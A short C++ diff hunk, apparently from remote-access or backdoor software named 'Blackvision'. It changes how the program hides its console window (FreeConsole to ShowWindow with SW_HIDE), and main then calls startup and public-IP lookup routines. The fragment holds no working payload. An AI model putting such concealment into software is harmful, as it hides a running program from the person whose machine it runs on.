@@ -3,7 +3,7 @@
 
 int main()
 {
-	FreeConsole();
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	Blackvision bv;
 	bv.startup();
 	bv.Wanip();
